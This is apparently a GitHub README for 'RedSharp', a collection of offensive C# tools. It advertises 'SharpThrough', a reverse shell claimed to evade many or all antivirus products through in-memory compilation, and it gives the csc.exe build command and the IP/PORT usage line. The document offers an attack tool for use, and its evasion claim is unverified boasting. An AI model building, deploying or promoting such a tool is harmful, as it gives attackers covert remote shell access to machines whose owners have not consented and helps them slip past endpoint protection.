# RedSharp
random C# tools and scripts for Pentesting and offensive stuff

## SharpThrough
Simple yet effective C# reverse shell, at the moment can bypass many (maybe all) AVs  
Simple technique is used -> it compiles code in memory  
IDE VS 2015 , csproj is available. Compile platform choiche is yours: suggested is x64  
You can also compile it with :  
```C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x64 /out:sharpthrough.exe Program.cs```  
```Usage :  sharpthrough.exe IP PORT```
